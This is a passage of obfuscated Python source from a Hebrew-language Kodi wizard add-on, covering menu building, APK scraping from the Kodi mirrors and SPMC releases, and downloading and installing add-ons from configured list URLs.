		if BUILDNAME ==OO00OOO00000O0OOO and O0OO00000O0O00O00 >BUILDVERSION :#line:2068
			O000OOOOOO0OOOO00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O000OOOOOO0OOOO00 ,BUILDVERSION )#line:2069
		OO0O0OO0OO00OOO00 =int (float (KODIV ));OO0OO0OOO0OOO0O0O =int (float (O000OOO0OO00O00O0 ))#line:2078
		if not OO0O0OO0OO00OOO00 ==OO0OO0OOO0OOO0O0O :#line:2079
			if OO0O0OO0OO00OOO00 ==16 and OO0OO0OOO0OOO0O0O <=15 :OO0OOO00O00OOOOOO =False #line:2080
			else :OO0OOO00O00OOOOOO =True #line:2081
		else :OO0OOO00O00OOOOOO =False #line:2082
		addFile ('התקנה','install',OO00OOO00000O0OOO ,'fresh',description =OOO000O00OOO0OO00 ,fanart =OO000O00O00OOO0OO ,icon =OO00OOO0O00OOOOOO ,themeit =THEME1 )#line:2086
		if not O00OO0OO0OOOO0OOO =='http://':#line:2089
			if wiz .workingURL (O00OO0OO0OOOO0OOO )==True :#line:2090
				addFile (wiz .sep ('THEMES'),'',fanart =OO000O00O00OOO0OO ,icon =OO00OOO0O00OOOOOO ,themeit =THEME3 )#line:2091
				OO00OOO0O00OOOOO0 =wiz .openURL (O00OO0OO0OOOO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2092
				OOOOO0O00O00O0OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OOO0O00OOOOO0 )#line:2093
				for O0OOO000OO00OO0OO ,O0OO0OO00O0O00OOO ,O0O0O0OO0O00OO000 ,O0O00O0O000000000 ,OO0OO00O0O0OO0OOO ,OOO000O00OOO0OO00 in OOOOO0O00O00O0OOO :#line:2094
					if not SHOWADULT =='true'and OO0OO00O0O0OO0OOO .lower ()=='yes':continue #line:2095
					O0O0O0OO0O00OO000 =O0O0O0OO0O00OO000 if O0O0O0OO0O00OO000 =='http://'else OO00OOO0O00OOOOOO #line:2096
					O0O00O0O000000000 =O0O00O0O000000000 if O0O00O0O000000000 =='http://'else OO000O00O00OOO0OO #line:2097
					addFile (O0OOO000OO00OO0OO if not O0OOO000OO00OO0OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOO000OO00OO0OO ,'theme',OO00OOO00000O0OOO ,O0OOO000OO00OO0OO ,description =OOO000O00OOO0OO00 ,fanart =O0O00O0O000000000 ,icon =O0O0O0OO0O00OO000 ,themeit =THEME3 )#line:2098
	setView ('files','viewType')#line:2099
def viewThirdList (OO00000OOOOO0O0O0 ):#line:2101
	OO0O000O0OOO00OO0 =eval ('THIRD%sNAME'%OO00000OOOOO0O0O0 )#line:2102
	OOO0O0OO000O00OO0 =eval ('THIRD%sURL'%OO00000OOOOO0O0O0 )#line:2103
	OO0OO0OOO0O000OO0 =wiz .workingURL (OOO0O0OO000O00OO0 )#line:2104
	if not OO0OO0OOO0O000OO0 ==True :#line:2105
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2106
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2107
	else :#line:2108
		O0O0OOO0O0O0OO0OO ,OOO000O0OOO0000OO =wiz .thirdParty (OOO0O0OO000O00OO0 )#line:2109
		addFile ("[B]%s[/B]"%OO0O000O0OOO00OO0 ,'',themeit =THEME3 )#line:2110
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2111
		if O0O0OOO0O0O0OO0OO :#line:2112
			for OO0O000O0OOO00OO0 ,O00O000O00OO0OO00 ,OOO0O0OO000O00OO0 ,O0OO000O000000OOO ,OOOOOOO0000O0OOO0 ,OOOOO00OOO000O000 ,OOOOOO0O0O0OOOOO0 ,OO0OOO000O0OO0000 in OOO000O0OOO0000OO :#line:2113
				if not SHOWADULT =='true'and OOOOOO0O0O0OOOOO0 .lower ()=='yes':continue #line:2114
				addFile ("[%s] %s v%s"%(O0OO000O000000OOO ,OO0O000O0OOO00OO0 ,O00O000O00OO0OO00 ),'installthird',OO0O000O0OOO00OO0 ,OOO0O0OO000O00OO0 ,icon =OOOOOOO0000O0OOO0 ,fanart =OOOOO00OOO000O000 ,description =OO0OOO000O0OO0000 ,themeit =THEME2 )#line:2115
		else :#line:2116
			for OO0O000O0OOO00OO0 ,OOO0O0OO000O00OO0 ,OOOOOOO0000O0OOO0 ,OOOOO00OOO000O000 ,OO0OOO000O0OO0000 in OOO000O0OOO0000OO :#line:2117
				addFile (OO0O000O0OOO00OO0 ,'installthird',OO0O000O0OOO00OO0 ,OOO0O0OO000O00OO0 ,icon =OOOOOOO0000O0OOO0 ,fanart =OOOOO00OOO000O000 ,description =OO0OOO000O0OO0000 ,themeit =THEME2 )#line:2118
def editThirdParty (OO00OOO0O000O0OOO ):#line:2120
	O0OO0OO00OO00OOO0 =eval ('THIRD%sNAME'%OO00OOO0O000O0OOO )#line:2121
	OOO0O00OOOOO00OOO =eval ('THIRD%sURL'%OO00OOO0O000O0OOO )#line:2122
	OO0O000O000000000 =wiz .getKeyboard (O0OO0OO00OO00OOO0 ,'Enter the Name of the Wizard')#line:2123
	O0O0000O00O0OOOO0 =wiz .getKeyboard (OOO0O00OOOOO00OOO ,'Enter the URL of the Wizard Text')#line:2124
	wiz .setS ('wizard%sname'%OO00OOO0O000O0OOO ,OO0O000O000000000 )#line:2126
	wiz .setS ('wizard%surl'%OO00OOO0O000O0OOO ,O0O0000O00O0OOOO0 )#line:2127
def apkScraper (name =""):#line:2129
	if name =='kodi':#line:2130
		OO0OOOO000OO00OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2131
		O00000000O000000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2132
		O00OOOO0OOOOOOO0O =wiz .openURL (OO0OOOO000OO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2133
		OO00O0OOOO0O0000O =wiz .openURL (O00000000O000000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2134
		OOO0OOO00OO00O0O0 =0 #line:2135
		OOOO0O00OO000OOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00OOOO0OOOOOOO0O )#line:2136
		O0O0OOO00OO0O0OO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O0OOOO0O0000O )#line:2137
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2139
		O00OO00000OOOO00O =False #line:2140
		for OO00OO0O0OO0O00O0 ,name ,OOOO00000O00OO000 ,O0O000OO0000000O0 in OOOO0O00OO000OOO0 :#line:2141
			if OO00OO0O0OO0O00O0 in ['../','old/']:continue #line:2142
			if not OO00OO0O0OO0O00O0 .endswith ('.apk'):continue #line:2143
			if not OO00OO0O0OO0O00O0 .find ('_')==-1 and O00OO00000OOOO00O ==True :continue #line:2144
			try :#line:2145
				O000OO0OOOOOOO0O0 =name .split ('-')#line:2146
				if not OO00OO0O0OO0O00O0 .find ('_')==-1 :#line:2147
					O00OO00000OOOO00O =True #line:2148
					O00000OO0OO000O00 ,O0O0OOO000O0O0O00 =O000OO0OOOOOOO0O0 [2 ].split ('_')#line:2149
				else :#line:2150
					O00000OO0OO000O00 =O000OO0OOOOOOO0O0 [2 ]#line:2151
					O0O0OOO000O0O0O00 =''#line:2152
				OOOOO0O00O0O00O0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OO0OOOOOOO0O0 [0 ].title (),O000OO0OOOOOOO0O0 [1 ],O0O0OOO000O0O0O00 .upper (),O00000OO0OO000O00 ,COLOR2 ,OOOO00000O00OO000 .replace (' ',''),COLOR1 ,O0O000OO0000000O0 )#line:2153
				OOO0OO0OO0OOOO0O0 =urljoin (OO0OOOO000OO00OOO ,OO00OO0O0OO0O00O0 )#line:2154
				addFile (OOOOO0O00O0O00O0O ,'apkinstall',"%s v%s%s %s"%(O000OO0OOOOOOO0O0 [0 ].title (),O000OO0OOOOOOO0O0 [1 ],O0O0OOO000O0O0O00 .upper (),O00000OO0OO000O00 ),OOO0OO0OO0OOOO0O0 )#line:2155
				OOO0OOO00OO00O0O0 +=1 #line:2156
			except :#line:2157
				wiz .log ("Error on: %s"%name )#line:2158
		for OO00OO0O0OO0O00O0 ,name ,OOOO00000O00OO000 ,O0O000OO0000000O0 in O0O0OOO00OO0O0OO0 :#line:2160
			if OO00OO0O0OO0O00O0 in ['../','old/']:continue #line:2161
			if not OO00OO0O0OO0O00O0 .endswith ('.apk'):continue #line:2162
			if not OO00OO0O0OO0O00O0 .find ('_')==-1 :continue #line:2163
			try :#line:2164
				O000OO0OOOOOOO0O0 =name .split ('-')#line:2165
				OOOOO0O00O0O00O0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OO0OOOOOOO0O0 [0 ].title (),O000OO0OOOOOOO0O0 [1 ],O000OO0OOOOOOO0O0 [2 ],COLOR2 ,OOOO00000O00OO000 .replace (' ',''),COLOR1 ,O0O000OO0000000O0 )#line:2166
				OOO0OO0OO0OOOO0O0 =urljoin (O00000000O000000O ,OO00OO0O0OO0O00O0 )#line:2167
				addFile (OOOOO0O00O0O00O0O ,'apkinstall',"%s v%s %s"%(O000OO0OOOOOOO0O0 [0 ].title (),O000OO0OOOOOOO0O0 [1 ],O000OO0OOOOOOO0O0 [2 ]),OOO0OO0OO0OOOO0O0 )#line:2168
				OOO0OOO00OO00O0O0 +=1 #line:2169
			except :#line:2170
				wiz .log ("Error on: %s"%name )#line:2171
		if OOO0OOO00OO00O0O0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2172
	elif name =='spmc':#line:2173
		O0O0000O000OOO0O0 ='https://github.com/koying/SPMC/releases'#line:2174
		O00OOOO0OOOOOOO0O =wiz .openURL (O0O0000O000OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2175
		OOO0OOO00OO00O0O0 =0 #line:2176
		OOOO0O00OO000OOO0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00OOOO0OOOOOOO0O )#line:2177
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2179
		for name ,O00OO0O00OOO0O000 in OOOO0O00OO000OOO0 :#line:2181
			OOOO0OOO0OOOO00O0 =''#line:2182
			O0O0OOO00OO0O0OO0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00OO0O00OOO0O000 )#line:2183
			for O0O000O0O0O000O0O ,O0000O0O000O00OOO ,OOO0OO0OOO0O000OO in O0O0OOO00OO0O0OO0 :#line:2184
				if OOO0OO0OOO0O000OO .find ('armeabi')==-1 :continue #line:2185
				if OOO0OO0OOO0O000OO .find ('launcher')>-1 :continue #line:2186
				OOOO0OOO0OOOO00O0 =urljoin ('https://github.com',O0O000O0O0O000O0O )#line:2187
				break #line:2188
		if OOO0OOO00OO00O0O0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2190
def apkMenu (url =None ):#line:2192
	if url ==None :#line:2193
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2196
	if not APKFILE =='http://':#line:2197
		if url ==None :#line:2198
			O0OOOO00OO00OO000 =wiz .workingURL (APKFILE )#line:2199
			OOO0O0O00O0O000OO =uservar .APKFILE #line:2200
		else :#line:2201
			O0OOOO00OO00OO000 =wiz .workingURL (url )#line:2202
			OOO0O0O00O0O000OO =url #line:2203
		if O0OOOO00OO00OO000 ==True :#line:2204
			O000O0OOO0OO0O000 =wiz .openURL (OOO0O0O00O0O000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2205
			O0OO0OOOO00O00O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O0OOO0OO0O000 )#line:2206
			if len (O0OO0OOOO00O00O00 )>0 :#line:2207
				O00O0O0OOOOOOOO0O =0 #line:2208
				for O0O0OO00OOOO0000O ,OO0OO0O0OOOO0OO0O ,url ,O0OOOOO0O000O0O00 ,O00OOO0O0000OO000 ,O00O00O0O00O00O00 ,OO0O0OOO00OO000OO in O0OO0OOOO00O00O00 :#line:2209
					if not SHOWADULT =='true'and O00O00O0O00O00O00 .lower ()=='yes':continue #line:2210
					if OO0OO0O0OOOO0OO0O .lower ()=='yes':#line:2211
						O00O0O0OOOOOOOO0O +=1 #line:2212
						addDir ("[B]%s[/B]"%O0O0OO00OOOO0000O ,'apk',url ,description =OO0O0OOO00OO000OO ,icon =O0OOOOO0O000O0O00 ,fanart =O00OOO0O0000OO000 ,themeit =THEME3 )#line:2213
					else :#line:2214
						O00O0O0OOOOOOOO0O +=1 #line:2215
						addFile (O0O0OO00OOOO0000O ,'apkinstall',O0O0OO00OOOO0000O ,url ,description =OO0O0OOO00OO000OO ,icon =O0OOOOO0O000O0O00 ,fanart =O00OOO0O0000OO000 ,themeit =THEME2 )#line:2216
					if O00O0O0OOOOOOOO0O <1 :#line:2217
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2218
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2219
		else :#line:2220
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2221
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2222
			addFile ('%s'%O0OOOO00OO00OO000 ,'',themeit =THEME3 )#line:2223
		return #line:2224
	else :wiz .log ("[APK Menu] No APK list added.")#line:2225
	setView ('files','viewType')#line:2226
def addonMenu (url =None ):#line:2228
	if not ADDONFILE =='http://':#line:2229
		if url ==None :#line:2230
			O0O00O0OO00O0O0O0 =wiz .workingURL (ADDONFILE )#line:2231
			O0OOOOO0OO0O000OO =uservar .ADDONFILE #line:2232
		else :#line:2233
			O0O00O0OO00O0O0O0 =wiz .workingURL (url )#line:2234
			O0OOOOO0OO0O000OO =url #line:2235
		if O0O00O0OO00O0O0O0 ==True :#line:2236
			OOO00000O0O00OOOO =wiz .openURL (O0OOOOO0OO0O000OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2237
			O0O00OOOOO0OOO000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00000O0O00OOOO )#line:2238
			if len (O0O00OOOOO0OOO000 )>0 :#line:2239
				O00OO00OO0O0O00O0 =0 #line:2240
				for O0O00OO00OOOOOOOO ,OOOOOO00000O0OO00 ,url ,OO00OOO000OO0O000 ,OOOOO0OO00OO00O00 ,O000OOOOOO0OOOOOO ,O00OOO0O0OOO0OO00 ,OO0O00OO000O0000O ,OO0O0O0O0O00OO0O0 ,O0OO0OO0O000O000O in O0O00OOOOO0OOO000 :#line:2241
					if OOOOOO00000O0OO00 .lower ()=='section':#line:2242
						O00OO00OO0O0O00O0 +=1 #line:2243
						addDir ("[B]%s[/B]"%O0O00OO00OOOOOOOO ,'addons',url ,description =O0OO0OO0O000O000O ,icon =O00OOO0O0OOO0OO00 ,fanart =OO0O00OO000O0000O ,themeit =THEME3 )#line:2244
					else :#line:2245
						if not SHOWADULT =='true'and OO0O0O0O0O00OO0O0 .lower ()=='yes':continue #line:2246
						try :#line:2247
							O00OOO00O000OO00O =xbmcaddon .Addon (id =OOOOOO00000O0OO00 ).getAddonInfo ('path')#line:2248
							if os .path .exists (O00OOO00O000OO00O ):#line:2249
								O0O00OO00OOOOOOOO ="[COLOR green][Installed][/COLOR] %s"%O0O00OO00OOOOOOOO #line:2250
						except :#line:2251
							pass #line:2252
						O00OO00OO0O0O00O0 +=1 #line:2253
						addFile (O0O00OO00OOOOOOOO ,'addoninstall',OOOOOO00000O0OO00 ,O0OOOOO0OO0O000OO ,description =O0OO0OO0O000O000O ,icon =O00OOO0O0OOO0OO00 ,fanart =OO0O00OO000O0000O ,themeit =THEME2 )#line:2254
					if O00OO00OO0O0O00O0 <1 :#line:2255
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2256
			else :#line:2257
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2258
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2259
		else :#line:2260
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2261
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2262
			addFile ('%s'%O0O00O0OO00O0O0O0 ,'',themeit =THEME3 )#line:2263
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2264
	setView ('files','viewType')#line:2265
def addonInstaller (O0OOO0O00OOOOO0OO ,O0OO000OOOO00OO0O ):#line:2267
	if not ADDONFILE =='http://':#line:2268
		O0OOO00OOO0O000O0 =wiz .workingURL (O0OO000OOOO00OO0O )#line:2269
		if O0OOO00OOO0O000O0 ==True :#line:2270
			OO0OO0O0O00OO0O00 =wiz .openURL (O0OO000OOOO00OO0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2271
			O000O0O0O00OOOO0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOO0O00OOOOO0OO ).findall (OO0OO0O0O00OO0O00 )#line:2272
			if len (O000O0O0O00OOOO0O )>0 :#line:2273
				for O0000OO0OOO000O00 ,O0OO000OOOO00OO0O ,O00000000OOO0OOO0 ,OOO0OO00OO0O0OOO0 ,OOO0000OO00O00000 ,OO0OO00O00O0O00OO ,O000OO00O0OO00OO0 ,OOO0OO000OO0000OO ,O000OO00OOOOO0OOO in O000O0O0O00OOOO0O :#line:2274
					if os .path .exists (os .path .join (ADDONS ,O0OOO0O00OOOOO0OO )):#line:2275
						O0O0OOO0000OOOOOO =['Launch Addon','Remove Addon']#line:2276
						O00O0OOO00000OO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0O0OOO0000OOOOOO )#line:2277
						if O00O0OOO00000OO00 ==0 :#line:2278
							wiz .ebi ('RunAddon(%s)'%O0OOO0O00OOOOO0OO )#line:2279
							xbmc .sleep (1000 )#line:2280
							return True #line:2281
						elif O00O0OOO00000OO00 ==1 :#line:2282
							wiz .cleanHouse (os .path .join (ADDONS ,O0OOO0O00OOOOO0OO ))#line:2283
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OOO0O00OOOOO0OO ))#line:2284
							except :pass #line:2285
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOO0O00OOOOO0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2286
								removeAddonData (O0OOO0O00OOOOO0OO )#line:2287
							wiz .refresh ()#line:2288
							return True #line:2289
						else :#line:2290
							return False #line:2291
					O0O00O000O0O000O0 =os .path .join (ADDONS ,O00000000OOO0OOO0 )#line:2292
					if not O00000000OOO0OOO0 .lower ()=='none'and not os .path .exists (O0O00O000O0O000O0 ):#line:2293
						wiz .log ("Repository not installed, installing it")#line:2294
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OOO0O00OOOOO0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00000000OOO0OOO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2295
							OOOO00OO0OOO00O00 =wiz .parseDOM (wiz .openURL (OOO0OO00OO0O0OOO0 ),'addon',ret ='version',attrs ={'id':O00000000OOO0OOO0 })#line:2296
							if len (OOOO00OO0OOO00O00 )>0 :#line:2297
								O0OOOOOO000OO0OO0 ='%s%s-%s.zip'%(OOO0000OO00O00000 ,O00000000OOO0OOO0 ,OOOO00OO0OOO00O00 [0 ])#line:2298
								wiz .log (O0OOOOOO000OO0OO0 )#line:2299
								if KODIV >=17 :wiz .addonDatabase (O00000000OOO0OOO0 ,1 )#line:2300
								installAddon (O00000000OOO0OOO0 ,O0OOOOOO000OO0OO0 )#line:2301
								wiz .ebi ('UpdateAddonRepos()')#line:2302
								wiz .log ("Installing Addon from Kodi")#line:2304
								OO0OOOO0O0000OOO0 =installFromKodi (O0OOO0O00OOOOO0OO )#line:2305
								wiz .log ("Install from Kodi: %s"%OO0OOOO0O0000OOO0 )#line:2306
								if OO0OOOO0O0000OOO0 :#line:2307
									wiz .refresh ()#line:2308
									return True #line:2309
							else :#line:2310
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00000000OOO0OOO0 )#line:2311
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OOO0O00OOOOO0OO ,O00000000OOO0OOO0 ))#line:2312
					elif O00000000OOO0OOO0 .lower ()=='none':#line:2313
						wiz .log ("No repository, installing addon")#line:2314
						O0000O00OOOO00OO0 =O0OOO0O00OOOOO0OO #line:2315
						OOOO0OO0O0OO00O00 =O0OO000OOOO00OO0O #line:2316
						installAddon (O0OOO0O00OOOOO0OO ,O0OO000OOOO00OO0O )#line:2317
						wiz .refresh ()#line:2318
						return True #line:2319
					else :#line:2320
						wiz .log ("Repository installed, installing addon")#line:2321
						OO0OOOO0O0000OOO0 =installFromKodi (O0OOO0O00OOOOO0OO ,False )#line:2322
						if OO0OOOO0O0000OOO0 :#line:2323
							wiz .refresh ()#line:2324
							return True #line:2325
					if os .path .exists (os .path .join (ADDONS ,O0OOO0O00OOOOO0OO )):return True #line:2326
					OOOO000OO0OOO00O0 =wiz .parseDOM (wiz .openURL (OOO0OO00OO0O0OOO0 ),'addon',ret ='version',attrs ={'id':O0OOO0O00OOOOO0OO })#line:2327
					if len (OOOO000OO0OOO00O0 )>0 :#line:2328
						O0OO000OOOO00OO0O ="%s%s-%s.zip"%(O0OO000OOOO00OO0O ,O0OOO0O00OOOOO0OO ,OOOO000OO0OOO00O0 [0 ])#line:2329
						wiz .log (str (O0OO000OOOO00OO0O ))#line:2330
						if KODIV >=17 :wiz .addonDatabase (O0OOO0O00OOOOO0OO ,1 )#line:2331
						installAddon (O0OOO0O00OOOOO0OO ,O0OO000OOOO00OO0O )#line:2332
						wiz .refresh ()#line:2333
					else :#line:2334
						wiz .log ("no match");return False #line:2335
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2336
		else :wiz .log ("[Addon Installer] Text File: %s"%O0OOO00OOO0O000O0 )#line:2337
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2338
def installFromKodi (O0O0O000OOO0O0OOO ,over =True ):#line:2340
	if over ==True :#line:2341
		xbmc .sleep (2000 )#line:2342
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0O000OOO0O0OOO )#line:2344
	if not wiz .whileWindow ('yesnodialog'):#line:2345
		return False #line:2346
	xbmc .sleep (1000 )#line:2347
	if wiz .whileWindow ('okdialog'):#line:2348
		return False #line:2349
	wiz .whileWindow ('progressdialog')#line:2350
	if os .path .exists (os .path .join (ADDONS ,O0O0O000OOO0O0OOO )):return True #line:2351
	else :return False #line:2352
def installAddon (OO0OOO00O0O000OO0 ,O0OOOOO0000OOOOO0 ):#line:2354
	if not wiz .workingURL (O0OOOOO0000OOOOO0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0OOO00O0O000OO0 ,COLOR2 ));return #line:2355
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2356
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00O0O000OO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2357
	O0OOOOOO0OOO00O00 =O0OOOOO0000OOOOO0 .split ('/')#line:2358
	OO0OOOOOOOO0O00O0 =os .path .join (PACKAGES ,O0OOOOOO0OOO00O00 [-1 ])#line:2359
	try :os .remove (OO0OOOOOOOO0O00O0 )#line:2360
	except :pass #line:2361
	downloader .download (O0OOOOO0000OOOOO0 ,OO0OOOOOOOO0O00O0 ,DP )#line:2362
	O0000000OO00OOOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00O0O000OO0 )#line:2363
	DP .update (0 ,O0000000OO00OOOOO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2364
	OOOO00OOO0000O0OO ,O0O0OO00OOO00OOO0 ,OOOO0O00O0O00OO0O =extract .all (OO0OOOOOOOO0O00O0 ,ADDONS ,DP ,title =O0000000OO00OOOOO )#line:2365
	DP .update (0 ,O0000000OO00OOOOO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2366
	installed (OO0OOO00O0O000OO0 )#line:2367
	installDep (OO0OOO00O0O000OO0 ,DP )#line:2368
	DP .close ()#line:2369
	wiz .ebi ('UpdateAddonRepos()')#line:2370
	wiz .ebi ('UpdateLocalAddons()')#line:2371
	wiz .refresh ()#line:2372
def installDep (OOO00OOOOO000OO0O ,DP =None ):#line:2374
	OO00000O000OO0OO0 =os .path .join (ADDONS ,OOO00OOOOO000OO0O ,'addon.xml')#line:2375
	if os .path .exists (OO00000O000OO0OO0 ):#line:2376
		OO00OOOOO00000O0O =open (OO00000O000OO0OO0 ,mode ='r');O0O0O0O00O00OOO00 =OO00OOOOO00000O0O .read ();OO00OOOOO00000O0O .close ();#line:2377
		O0O0OO00O0O000OOO =wiz .parseDOM (O0O0O0O00O00OOO00 ,'import',ret ='addon')#line:2378
		for OO00O000000O0OOO0 in O0O0OO00O0O000OOO :#line:2379
			if not 'xbmc.python'in OO00O000000O0OOO0 :#line:2380
				if not DP ==None :#line:2381
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O000000O0OOO0 ))#line:2382
				wiz .createTemp (OO00O000000O0OOO0 )#line:2383
def installed (OOO0O0OOOO0OO0O00 ):#line:2410
	O000OOO0OOO0OO00O =os .path .join (ADDONS ,OOO0O0OOOO0OO0O00 ,'addon.xml')#line:2411
	if os .path .exists (O000OOO0OOO0OO00O ):#line:2412
		try :#line:2413
			O0OO00000000OO0OO =open (O000OOO0OOO0OO00O ,mode ='r');O00000OO000OOOO0O =O0OO00000000OO0OO .read ();O0OO00000000OO0OO .close ()#line:2414
			O00000OO0OOOO0O0O =wiz .parseDOM (O00000OO000OOOO0O ,'addon',ret ='name',attrs ={'id':OOO0O0OOOO0OO0O00 })#line:2415
			O00O0O0OO000O00O0 =os .path .join (ADDONS ,OOO0O0OOOO0OO0O00 ,'icon.png')#line:2416
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000OO0OOOO0O0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00O0O0OO000O00O0 )#line:2417
		except :pass #line:2418
def youtubeMenu (url =None ):#line:2420
	if not YOUTUBEFILE =='http://':#line:2421
		if url ==None :#line:2422
			OOOOOOO0OO00OO0O0 =wiz .workingURL (YOUTUBEFILE )#line:2423
			O0O0OO0000O00000O =uservar .YOUTUBEFILE #line:2424
		else :#line:2425
			OOOOOOO0OO00OO0O0 =wiz .workingURL (url )#line:2426
			O0O0OO0000O00000O =url #line:2427
		if OOOOOOO0OO00OO0O0 ==True :#line:2428
			OOOOOO0OO0O000OO0 =wiz .openURL (O0O0OO0000O00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2429
			OO0OO00O0OO0OOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOOOO0OO0O000OO0 )#line:2430
			if len (OO0OO00O0OO0OOO0O )>0 :#line:2431
				for OO0OOOO0O0OO0O0OO ,O000O0OOO0OO0O00O ,url ,OO0O0OO00OO00OO0O ,OOOO0O0O00OO000OO ,O0OOO0O00O0O000OO in OO0OO00O0OO0OOO0O :#line:2432
					if O000O0OOO0OO0O00O .lower ()=="yes":#line:2433
						addDir ("[B]%s[/B]"%OO0OOOO0O0OO0O0OO ,'youtube',url ,description =O0OOO0O00O0O000OO ,icon =OO0O0OO00OO00OO0O ,fanart =OOOO0O0O00OO000OO ,themeit =THEME3 )#line:2434
					else :#line:2435
